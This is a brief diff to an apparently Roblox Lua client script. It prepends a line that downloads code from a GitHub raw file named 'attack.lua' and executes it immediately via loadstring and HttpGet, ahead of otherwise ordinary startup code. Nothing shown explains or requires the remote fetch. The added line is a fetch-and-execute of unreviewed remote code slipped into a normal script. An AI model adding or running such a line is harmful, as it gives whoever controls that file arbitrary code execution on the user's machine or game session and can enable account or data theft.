@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thienvl1395-dot/script/refs/heads/main/attack.lua"))()
+
 repeat task.wait() until game:IsLoaded() and game.Players.LocalPlayer
 
 local Players = game:GetService("Players")
